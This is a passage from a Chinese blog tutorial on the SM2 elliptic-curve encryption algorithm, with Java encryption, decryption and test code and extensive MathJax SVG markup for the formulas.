662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(922.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1978.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(2256.6,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mo" transform="translate(2832.6,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(3110.6,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>忽略</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200516180800.png"></p>
<p>详细代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加密</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(<span class="type">byte</span>[] publicKey, <span class="type">byte</span>[] data)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">    <span class="keyword">if</span> (publicKey == <span class="literal">null</span> || publicKey.length == <span class="number">0</span>) {  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    }  </span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span> || data.length == <span class="number">0</span>) {  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    }   </span><br><span class="line">    <span class="type">byte</span>[] source = <span class="keyword">new</span> <span class="title class_">byte</span>[data.length];  </span><br><span class="line">    System.arraycopy(data, <span class="number">0</span>, source, <span class="number">0</span>, data.length);  </span><br><span class="line">    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cipher</span>();</span><br><span class="line">    <span class="type">SM2</span> <span class="variable">sm2</span> <span class="operator">=</span> SM2.Instance();  </span><br><span class="line">    <span class="type">ECPoint</span> <span class="variable">userKey</span> <span class="operator">=</span> sm2.ecc_curve.decodePoint(publicKey);  </span><br><span class="line">    <span class="type">ECPoint</span> <span class="variable">c1</span> <span class="operator">=</span> cipher.Init_enc(sm2, userKey);  </span><br><span class="line">    cipher.Encrypt(source);  </span><br><span class="line">    <span class="type">byte</span>[] c3 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32</span>];  </span><br><span class="line">    cipher.Dofinal(c3);    </span><br><span class="line">    <span class="keyword">return</span> Util.byteToHex(c1.getEncoded()) + Util.byteToHex(source) + Util.byteToHex(c3);  </span><br><span class="line">}  </span><br></pre></td></tr></table></figure></li>
<li><p>对密文C解密</p>
<p>流程如下，其中由于<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.451ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 2409.6 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mo" transform="translate(853.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1909.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，第2步计算<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="9.643ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4262.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(922.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(1978.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(2256.6,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mo" transform="translate(2832.6,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(3110.6,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>忽略</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200516182148.png"></p>
<p>详细代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解密  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] privateKey, <span class="type">byte</span>[] encryptedData) <span class="keyword">throws</span> IOException {  </span><br><span class="line">    <span class="keyword">if</span> (privateKey == <span class="literal">null</span> || privateKey.length == <span class="number">0</span>) {  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    }   </span><br><span class="line">    <span class="keyword">if</span> (encryptedData == <span class="literal">null</span> || encryptedData.length == <span class="number">0</span>) {  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    }  </span><br><span class="line">    <span class="comment">//加密字节数组转换为十六进制的字符串,长度变为encryptedData.length*2 </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> Util.byteToHex(encryptedData);  </span><br><span class="line">    <span class="comment">/*分解加密字串 </span></span><br><span class="line"><span class="comment">    	* （C1 = C1标志位2位 + C1实体部分128位 = 130） </span></span><br><span class="line"><span class="comment">        * （C3 = C3实体部分64位  = 64） </span></span><br><span class="line"><span class="comment">        * （C2 = encryptedData.length * 2 - C1长度  - C2长度） </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="type">byte</span>[] c1Bytes = Util.hexToByte(data.substring(<span class="number">0</span>,<span class="number">130</span>));  </span><br><span class="line">    <span class="type">int</span> <span class="variable">c2Len</span> <span class="operator">=</span> encryptedData.length-<span class="number">97</span>;  </span><br><span class="line">    <span class="type">byte</span>[] c2 = Util.hexToByte(data.substring(<span class="number">130</span>,<span class="number">130</span>+<span class="number">2</span>*c2Len));  </span><br><span class="line">    <span class="type">byte</span>[] c3 = Util.hexToByte(data.substring(<span class="number">130</span>+<span class="number">2</span>*c2Len,<span class="number">194</span>+<span class="number">2</span>*c2Len));  </span><br><span class="line">    <span class="type">SM2</span> <span class="variable">sm2</span> <span class="operator">=</span> SM2.Instance();  </span><br><span class="line">    <span class="type">BigInteger</span> <span class="variable">userD</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>, privateKey);  </span><br><span class="line">    <span class="comment">//通过C1实体字节来生成ECPoint  </span></span><br><span class="line">    <span class="type">ECPoint</span> <span class="variable">c1</span> <span class="operator">=</span> sm2.ecc_curve.decodePoint(c1Bytes);  </span><br><span class="line">    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cipher</span>();  </span><br><span class="line">    cipher.Init_dec(userD, c1);  </span><br><span class="line">    cipher.Decrypt(c2);  </span><br><span class="line">    cipher.Dofinal(c3);  </span><br><span class="line">    <span class="keyword">return</span> c2;  </span><br><span class="line">} </span><br></pre></td></tr></table></figure></li>
<li><p>测试SM2算法</p>
<p>测试代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception   </span><br><span class="line">{  </span><br><span class="line">    <span class="comment">//生成密钥对  </span></span><br><span class="line">    generateKeyPair();  </span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">"leeyuxun@163.com"</span>;  </span><br><span class="line">    <span class="type">byte</span>[] sourceData = message.getBytes();  </span><br><span class="line">    System.out.println(<span class="string">"明文消息: "</span>); </span><br><span class="line">    System.out.println(message); </span><br><span class="line">    <span class="comment">//下面的秘钥可以使用generateKeyPair()生成的秘钥内容  </span></span><br><span class="line">    <span class="comment">// 国密规范正式私钥  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">prik</span> <span class="operator">=</span> <span class="string">"3690655E33D5EA3D9A4AE1A1ADD766FDEA045CDEAA43A9206FB8C430CEFE0D94"</span>;  </span><br><span class="line">    <span class="comment">// 国密规范正式公钥  </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">pubk</span> <span class="operator">=</span> <span class="string">"04F6E0C3345AE42B51E06BF50B98834988D54EBC7460FE135A48171BC0629EAE205EEDE253A530608178A98F1E19BB737302813BA39ED3FA3C51639D7A20C7391A"</span>;  </span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">"密文: "</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">cipherText</span> <span class="operator">=</span> SM2Utils.encrypt(Util.hexToByte(pubk), sourceData);  </span><br><span class="line">    System.out.println(cipherText);  </span><br><span class="line">    System.out.println(<span class="string">"解密: "</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(SM2Utils.decrypt(Util.hexToByte(prik), Util.hexToByte(cipherText)));  </span><br><span class="line">    System.out.println(plainText);  </span><br><span class="line">}  </span><br></pre></td></tr></table></figure>

<p>运行结果如下，SM2可以进行正确加解密；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200517001421.png"></p>
</li>
</ol>
<ul>
<li>SM2算法的实现关键点是保证加密流程第4步计算的<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="15.453ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6830 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(799,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(1077,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(2616.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3672.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4061.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5069.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5514.5,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6441,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 与解密流程第3步计算的<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.603ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7338.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g><g data-mml-node="mo" transform="translate(1417.7,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="msub" transform="translate(1695.7,0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mn" transform="translate(748,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(3125,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(4180.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4569.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5578.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(6023,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 